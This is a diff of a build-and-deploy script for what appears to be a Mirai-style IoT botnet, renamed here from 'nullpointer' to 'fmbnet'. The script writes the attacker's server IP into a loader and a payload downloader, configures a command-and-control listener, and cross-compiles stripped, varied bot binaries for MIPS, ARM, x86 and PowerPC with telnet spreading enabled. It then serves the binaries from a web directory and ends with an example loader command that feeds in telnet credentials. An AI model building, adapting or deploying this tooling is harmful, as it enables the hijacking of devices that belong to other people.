@@ -18,8 +18,10 @@ fi
 [ -z "$PROTO_KEY" ] && PROTO_KEY=$(openssl rand -hex 32 2>/dev/null || echo "4e503132333435363738393031323334353637383930313233343536373839")
 PROTO_MAGIC="${PROTO_MAGIC:-$(printf '0x%04X' $((0x4000 + RANDOM % 0x3FFF)))}"
 INSTANCE_PORT="${INSTANCE_PORT:-$((13320 + RANDOM % 100))}"
+SHARED_SECRET="${SHARED_SECRET:-$PROTO_KEY}"
 NP_BUILD_RAND=${NP_BUILD_RAND:-$RANDOM}
 PROTO_DEF='-DPROTO_KEY_HEX="'"$PROTO_KEY"'"'
+PROTO_DEF="$PROTO_DEF -DSHARED_SECRET_HEX=\"$SHARED_SECRET\""
 PROTO_DEF="$PROTO_DEF -DPROTO_MAGIC_BOT=$PROTO_MAGIC -DNP_INSTANCE_PORT=$INSTANCE_PORT -DNP_BUILD_RAND=$NP_BUILD_RAND"
 
 RELEASE="$PROJECT_DIR/release"
@@ -38,7 +40,7 @@ sed -i "s|#define TFTP_SERVER \".*\"|#define TFTP_SERVER \"$SERVER_IP\"|" loader
 sed -i "s|addrs\[0\] = inet_addr(\".*\");|addrs[0] = inet_addr(\"$SERVER_IP\");|" loader/src/main.c
 
 dlr_ip=$(echo "$SERVER_IP" | tr '.' ',')
-sed -i "s|#define HTTP_SERVER utils_inet_addr(.*)|#define HTTP_SERVER utils_inet_addr($dlr_ip)|" dlr/main.c
+sed -i "s|#define GRPC_SERVER utils_inet_addr(.*)|#define GRPC_SERVER utils_inet_addr($dlr_ip)|" dlr/main.c
 
 sed -i "s|net.Listen(\"tcp\", \"[^\"]*\"|net.Listen(\"tcp\", \"$CNC_IP:34130\"|" scanListen.go
 
@@ -58,22 +60,22 @@ fi
 mkdir -p "$RELEASE"
 
 compile_x86() {
-	echo "[*] compiling nullpointer.x86"
+	echo "[*] compiling fmbnet.x86"
 	local files
 	files=($(ls bot/*.c | shuf 2>/dev/null || ls bot/*.c))
 	gcc -std=c99 -static -DNP_TELNET $PROTO_DEF -ffunction-sections -fdata-sections \
-		-w -Os ${files[@]} -o "$RELEASE/nullpointer.x86" -lpthread -Wl,--gc-sections
-	strip -s -x "$RELEASE/nullpointer.x86" 2>/dev/null || strip "$RELEASE/nullpointer.x86" -S --strip-unneeded 2>/dev/null || true
+		-w -Os ${files[@]} -o "$RELEASE/fmbnet.x86" -lpthread -ldl -Wl,--gc-sections
+	strip -s -x "$RELEASE/fmbnet.x86" 2>/dev/null || strip "$RELEASE/fmbnet.x86" -S --strip-unneeded 2>/dev/null || true
 }
 
 compile_multi() {
 	local specs=(
-		"i686-linux-gnu:nullpointer.x86:x86:X32"
-		"mips-linux-gnu:nullpointer.mips:mips:MIPS"
-		"mipsel-linux-gnu:nullpointer.mpsl:mpsl:MIPSEL"
-		"arm-linux-gnueabi:nullpointer.arm:arm:ARM"
-		"arm-linux-gnueabihf:nullpointer.arm7:arm7:ARM"
-		"powerpc-linux-gnu:nullpointer.ppc:ppc:PPC"
+		"i686-linux-gnu:fmbnet.x86:x86:X32"
+		"mips-linux-gnu:fmbnet.mips:mips:MIPS"
+		"mipsel-linux-gnu:fmbnet.mpsl:mpsl:MIPSEL"
+		"arm-linux-gnueabi:fmbnet.arm:arm:ARM"
+		"arm-linux-gnueabihf:fmbnet.arm7:arm7:ARM"
+		"powerpc-linux-gnu:fmbnet.ppc:ppc:PPC"
 	)
 	for spec in "${specs[@]}"; do
 		prefix="${spec%%:*}"
@@ -87,7 +89,7 @@ compile_multi() {
 			local files
 			files=($(ls bot/*.c | shuf 2>/dev/null || ls bot/*.c))
 			${prefix}-gcc -std=c99 -static -DNP_TELNET $PROTO_DEF -ffunction-sections -fdata-sections \
-				-w -Os ${files[@]} -o "$RELEASE/$out" -Dnullpointer_BOT_ARCH=\"$arch\" -lpthread -Wl,--gc-sections
+				-w -Os ${files[@]} -o "$RELEASE/$out" -Dfmbnet_BOT_ARCH=\"$arch\" -lpthread -ldl -Wl,--gc-sections
 			${prefix}-strip -s -x "$RELEASE/$out" 2>/dev/null || ${prefix}-strip "$RELEASE/$out" -S --strip-unneeded 2>/dev/null || true
 		else
 			echo "[!] skip $out (${prefix}-gcc not found)"
@@ -147,11 +149,11 @@ mkdir -p "$LOADER_BINS/bins"
 cp dlr/release/dlr.* "$LOADER_BINS/bins/" 2>/dev/null || true
 cp "$RELEASE/loader" "$LOADER_BINS/"
 
-echo "[*] deploying to /var/www/html/bins and /opt/nullpointer"
+echo "[*] deploying to /var/www/html/bins and /opt/fmbnet"
 sudo mkdir -p /var/www/html/bins
-sudo cp "$RELEASE"/nullpointer.* /var/www/html/bins/ 2>/dev/null || true
+sudo cp "$RELEASE"/fmbnet.* /var/www/html/bins/ 2>/dev/null || true
 sudo cp "$LOADER_BINS"/bins/dlr.* /var/www/html/bins/ 2>/dev/null || true
-sudo mkdir -p /opt/nullpointer
-sudo cp "$RELEASE/cnc" /opt/nullpointer/
-sudo cp "$RELEASE/config.json" /opt/nullpointer/ 2>/dev/null || true
+sudo mkdir -p /opt/fmbnet
+sudo cp "$RELEASE/cnc" /opt/fmbnet/
+sudo cp "$RELEASE/config.json" /opt/fmbnet/ 2>/dev/null || true
 echo "[*] done. loader: cd $LOADER_BINS && echo 'ip:23 user:pass arm7' | ./loader"
